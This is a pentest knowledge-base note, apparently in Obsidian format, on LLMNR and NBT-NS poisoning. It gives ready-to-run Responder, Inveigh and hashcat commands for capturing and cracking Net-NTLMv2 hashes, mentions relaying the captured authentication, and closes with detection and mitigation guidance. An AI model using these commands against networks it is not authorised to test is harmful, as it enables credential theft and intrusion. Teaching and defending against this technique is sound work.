---
tags:
  - "#type/technique"
  - "#tactic/TA0001"
  - "#technique/T1557.001"
  - "#stage/initial-access"
  - "#protocol/llmnr"
  - "#protocol/netbios"
  - "#os/windows"
  - "#tool/responder"
  - "#tool/inveigh"
  - "#tool/hashcat"
  - privileges/unauthenticated
aliases:
  - LLMNR Poisoning
  - NBT-NS Poisoning
  - Link-Local Multicast Name Resolution Poisoning
  - NetBIOS Name Service Poisoning
---

## Technique
___

LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) poisoning are attack techniques that target Windows name resolution fallback mechanisms. When a Windows system can't resolve a hostname using DNS, it falls back to these broadcast-based protocols. An attacker on the same network can respond to these broadcast requests, impersonating the requested resource and capturing authentication hashes.

This technique allows attackers to collect Net-NTLMv2 hashes that can be cracked offline or potentially relayed to authenticate to other services.

## Prerequisites
___

**Access Level:** Network access to the target environment (same broadcast domain)

**System State:** Tr arget Windows systems with LLMNR and/oNBT-NS enabled (default in most Windows environments)

**Tools:** Responder (Linux) or Inveigh (Windows)

## Execution
___

### From Linux Using Responder

1. Start Responder and listen for LLMNR/NBT-NS requests:
```bash
sudo responder -I eth0
```

2. Wait for authentication hashes to come in as systems attempt to resolve hostnames

3. Crack the captured Net-NTLMv2 hashes:
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### From Windows Using Inveigh

#### PowerShell Version
```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

#### C# Version (InveighZero)
```powershell
.\Inveigh.exe
```

You can view unique captured hashes by typing:
```
GET NTLMV2UNIQUE
```

View captured usernames:
```
GET NTLMV2USERNAMES
```

## Abuse Options
___

Once you've captured Net-NTLMv2 hashes, you have two primary options:

1. **Crack the hashes offline** using tools like Hashcat or John the Ripper to recover plaintext passwords
	1. [[hash_cracking]]

2. **Relay the authentication attempt** to other services using NTLM Relay attacks (see relay attacks technique)
	1. [[relay_attacks]]

### Hash Cracking with Hashcat

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```


## Detection & Mitigation
___

### Detection

- Monitor network traffic for unusual LLMNR and NBT-NS responses
- Look for authentication attempts from unexpected sources
- Use honeypot hostnames that trigger alerts when resolved

### Mitigation

1. **Disable LLMNR**: 
   - Via Group Policy: Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client > "Turn OFF multicast Name Resolution"

2. **Disable NBT-NS**:
   - Navigate to Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced tab > WINS tab
   - Select "Disable NetBios over TCP/IP"

If you cannot disable these protocols:

- Implement Network Access Control (NAC) to restrict unauthorized devices
- Require strong passwords (14+ characters with complexity) to make hash cracking difficult
- Segment networks to limit the scope of potential attacks
- Use SMB signing to prevent NTLM relay attacks
- Consider implementing additional authentication factors

